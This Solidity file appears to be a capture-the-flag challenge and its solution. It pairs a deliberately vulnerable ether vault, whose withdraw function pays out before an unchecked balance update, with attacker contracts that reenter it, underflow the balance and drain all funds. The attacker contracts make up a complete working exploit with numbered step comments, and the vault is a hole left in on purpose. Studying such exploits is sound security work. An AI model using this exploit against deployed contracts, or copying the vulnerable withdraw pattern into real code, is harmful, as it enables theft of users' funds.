// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract OptimizedSecurity101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract OptimizedAttackerSecurity101 {
    constructor(OptimizedSecurity101 _victim) payable {
        (new Attacker{value: msg.value}()).attack(_victim);

        selfdestruct(payable(msg.sender));
    }
}

contract Attacker {
    constructor() payable {}

    function attack(OptimizedSecurity101 _victim) external payable {
        _victim.deposit{value: 1 ether}();
        _victim.withdraw(1); // 1 - withdrawing just 1 wei
        _victim.withdraw(address(_victim).balance); // 4 - withdrawing the rest of the funds

        selfdestruct(payable(tx.origin));
    }

    // 2 - fallback function to receive the funds. Called after the first 1 wei withdrawal
    receive() external payable {
        if (address(this).balance != 1 wei) return;

        // 3 - Reentrancy attack to withdraw all the funds
        OptimizedSecurity101(msg.sender).withdraw(1 ether);
    }
}